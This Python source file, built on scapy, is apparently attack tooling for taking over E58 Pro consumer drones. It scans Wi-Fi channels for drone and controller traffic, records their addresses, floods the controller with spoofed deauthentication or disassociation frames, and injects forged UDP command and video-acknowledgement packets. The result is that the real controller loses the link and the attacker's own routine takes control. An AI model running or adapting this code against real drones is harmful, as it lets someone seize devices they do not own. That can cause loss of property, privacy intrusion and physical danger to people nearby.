from time import sleep
from collections import Callable
from typing import Optional

from scapy.arch import get_if_addr
from scapy.config import conf
from scapy.layers.dot11 import RadioTap, Dot11FCS, Dot11QoS, Dot11, Dot11Deauth, Dot11Disas, Dot11Beacon, Dot11Elt
from scapy.layers.inet import IP, UDP
from scapy.layers.l2 import LLC, SNAP
from scapy.packet import Packet
from scapy.sendrecv import sendp, send, sniff
from threading import Thread, Event

from e58pro.command_payloads import new_video_ack, E58ProBasePayload, E58VideoACKExtension

from e58pro.address_results import AddressResults

from scanners.channel_scanner import scan_channels
from scanners.interface_controller import InterfaceController

DEAUTH_REASON = 0x03
# 1314 microseconds. Arbitrary? I think I stole this value from airodump captures.
SEND_DURATION = 1314
DEAUTH_SUBTYPE = 12

# Can be either DOT11Deauth or Dot11Disas
DOT11_DISCONNECT_TYPE = Dot11Disas

DRONE_COMMAND_RECEIVE_PORT = 8800
DRONE_VIDEO_SEND_PORT = 1234

WILDCARD_IP = "0.0.0.0"

#COMPLEX_SCANNER_BPF_FILTER = "(wlan type mgt) or udp"
COMPLEX_SCANNER_BPF_FILTER = "udp"

SSID_ELEMENT_ID = 0

# TODO: Have the user choose either connected or connectionless mode.
#  If connectionless, start a scan, then do the unconnected_routine
#  If connected, initiate connection (have user do that?), then do connected routine.

UDP_SRC_PORT = 49092  # Arbitrary. Will be where video is sent back?
UDP_DST_PORT = 8800

EndpointRoutine = Callable[[str, UDP, Callable], None]


def _udp_layer_3_4(drone_ip: str, controller_ip: str) -> UDP:
    return IP(src=controller_ip, dst=drone_ip) / \
           UDP(sport=UDP_SRC_PORT, dport=UDP_DST_PORT)


def _dot11_data_layer(drone_mac: str, controller_mac: str) -> SNAP():
    return RadioTap(present="Rate+TXFlags") / \
           Dot11FCS(addr1=drone_mac, addr2=controller_mac, addr3=drone_mac, type=2, subtype=8) / \
           Dot11QoS() / \
           LLC(ssap=0xAA, dsap=0xAA) / \
           SNAP()


def _new_sequence_control(frag: int, seq: int) -> int:
    return (seq << 4) + frag


def new_deauth(dst_mac: str, src_mac: str, ap_mac: str, seq_num: int, reason: int) -> Dot11Deauth:
    sc = _new_sequence_control(0, seq_num)
    # TODO: Why is the RadioTap header with those present flags necessary?
    return RadioTap(present="Rate+TXFlags") / \
           Dot11(ID=SEND_DURATION, addr1=dst_mac, addr2=src_mac, addr3=ap_mac, SC=sc) / \
           DOT11_DISCONNECT_TYPE(reason=reason)


def _start_deauther(interface_name: str, is_terminating: Event, deauth: Packet) -> None:
    def deauth_loop():
        seq = 0
        while not is_terminating.set():
            sendp(deauth, iface=interface_name, verbose=False)
            deauth[Dot11].SC = _new_sequence_control(0, seq)
            seq += 1
            sleep(0.5)
    thread = Thread(target=deauth_loop)
    thread.start()


# FIXME: Will need to sniff for the current ack number using _scan_for_current_video_ack in auto_pwn
#  Combine autopwn and this file since it's not clear what should go where. They're very similar.
def _start_udp_keep_alive(interface_name: str, is_terminating: Event, l4_base: Packet, sender_func: Callable) -> None:
    def keep_alive_loop():
        # comm_keep_alive = l4_base / new_default_command_payload()
        video_keep_alive = l4_base / new_video_ack(0)

        seq_n = 0
        while not is_terminating.is_set():
            video_keep_alive[E58ProBasePayload].sequence_number = seq_n
            # sender_func(comm_keep_alive, iface=interface_name, verbose=False)
            sender_func(video_keep_alive, iface=interface_name, verbose=False)
            seq_n += 1
            sleep(0.05)

    thread = Thread(target=keep_alive_loop)
    thread.start()


def keep_alive_initialization(interface_name: str, l4_base: Packet, sender_func: Callable) -> Event:
    terminating_event = Event()
    _start_udp_keep_alive(interface_name, terminating_event, l4_base, sender_func)

    return terminating_event


# TODO: Also start thread that watches for video ACK numbers and responds to keep the video feed flowing.


def connectionless_interception_routine(interface_name: str,
                                        addrs: AddressResults,
                                        endpoint_routine: EndpointRoutine):
    """Intercepts an existing connection with a drone, then runs the endpoint routine 'payload' once complete.
    endpoint_routine accepts the name of the interface to use, a UDP packet to build packets with, and
    a function (either of scapy's send or sendp) to use to send."""
    layer_2 = _dot11_data_layer(addrs.drone_mac, addrs.controller_mac)
    layers_3_4 = _udp_layer_3_4(addrs.drone_ip, addrs.controller_ip)

    deauth = new_deauth(addrs.controller_mac, addrs.drone_mac, addrs.drone_mac, 1, DEAUTH_REASON)
    deauth_terminating = Event()
    try:
        _start_deauther(interface_name, deauth_terminating, deauth)
        endpoint_routine(interface_name, layer_2 / layers_3_4, sendp)
    except KeyboardInterrupt:
        pass
    finally:
        deauth_terminating.set()


def connected_interception_routine(interface_name: str,
                                   drone_ip: str,
                                   controller_ip: str,
                                   endpoint_routine: EndpointRoutine) -> None:
    """Used when you're actually connected to the drone's network."""
    layers_3_4 = _udp_layer_3_4(drone_ip, controller_ip)
    endpoint_routine(interface_name, layers_3_4, send)


def drone_packet_verifier(packet: Packet) -> Optional[AddressResults]:
    """Returns a pair of ((drone_mac, drone_ip), (controller_mac, controller_ip)) if verified, else None."""
    if UDP in packet:
        src_tup = (packet[Dot11].addr2, packet[IP].src)
        dst_tup = (packet[Dot11].addr1, packet[IP].dst)
        if packet[UDP].dport == DRONE_COMMAND_RECEIVE_PORT:
            return AddressResults(*dst_tup, *src_tup)
        elif packet[UDP].sport == DRONE_VIDEO_SEND_PORT:
            return AddressResults(*src_tup, *dst_tup)
    return None


def scan_for_drone(interface_name: str, secs_per_channel: float = 0.3) -> tuple[int, AddressResults]:
    """Scans over all supported channels attempting to find the drone.
    Blocks until the drone is found, at which point a tuple of
    (channel, drone_mac_ip_tup, controller_mac_ip_tup) is returned."""
    while True:
        match_generator = scan_channels(interface_name, secs_per_channel)
        for chan, p in match_generator:
            if addrs := drone_packet_verifier(p):
                return chan, addrs


def _find_info_val_for(element_id: int, beacon: Dot11Beacon) -> Optional[bytes]:
    layer = beacon
    while layer:
        if isinstance(layer, Dot11Elt) and layer.ID == element_id:
            return layer.info
        layer = layer.payload
    return None


def scan_for_drone_traffic(interface_name: str,
                           secs_per_channel: float,
                           ssid_prefix: bytes,
                           command_receive_port: int,
                           video_send_port: int
                           ) -> tuple[int, Optional[Dot11Beacon], Optional[UDP], Optional[UDP]]:
    """Scans each channel to find traffic that's indicative of a drone.
    Returns a tuple of (channel, found_beacon?, found_command?, found_video?) if any of traffic was found.
    For the SSID, only the prefix is checked. The entire string doesn't need to match."""
    while True:
        last_channel = None
        beacon = None
        command = None
        video = None
        for chan, packet in scan_channels(interface_name, secs_per_channel,):  # COMPLEX_SCANNER_BPF_FILTER):
            if last_channel != chan:
                if video or command or beacon:
                    return last_channel, beacon, command, video
                else:
                    beacon = None
                    command = None
                    video = None
                    last_channel = chan

            if Dot11Beacon in packet:
                ssid = _find_info_val_for(SSID_ELEMENT_ID, packet)
                if ssid and ssid.startswith(ssid_prefix):
                    beacon = packet
            elif UDP in packet:
                if packet[UDP].dport == command_receive_port:
                    command = packet
                elif packet[UDP].sport == video_send_port:
                    video = packet


def _scan_for_current_video_ack(interface_name: str, timeout: Optional[float] = None) -> Optional[int]:
    def is_video(p: Packet) -> bool:
        return E58VideoACKExtension in p
    found = sniff(iface=interface_name, count=1, filter="udp", lfilter=is_video, timeout=timeout)
    if found:
        return found[0][E58VideoACKExtension].ack_number
    else:
        return None


def connectionless_main(interface_name: str, secs_per_channel: float, endpoint_routine: EndpointRoutine) -> None:
    inter_controller = InterfaceController(interface_name)
    inter_controller.set_monitor_mode(True)

    print("Scanning for drone...")
    channel, addrs = scan_for_drone(interface_name, secs_per_channel)
    print(f"Found: {addrs}")
    inter_controller.set_channel(channel)  # Should already be on the correct channel, but we'll set it for correctness.

    connectionless_interception_routine(interface_name, addrs, endpoint_routine)
    print("Exiting")


def connected_main(interface_name: str, endpoint_routine: EndpointRoutine) -> None:
    # Accept BSSID and handle connection?
    try:
        our_ip = get_if_addr(interface_name)
        drone_ip = conf.route.route(WILDCARD_IP)[2]
        if drone_ip == WILDCARD_IP:
            raise RuntimeError("Unable to get default gateway. Are you connected?")
    except OSError as e:
        raise OSError(f"Cannot find device {interface_name}") from e

    connected_interception_routine(interface_name, drone_ip, our_ip, endpoint_routine)

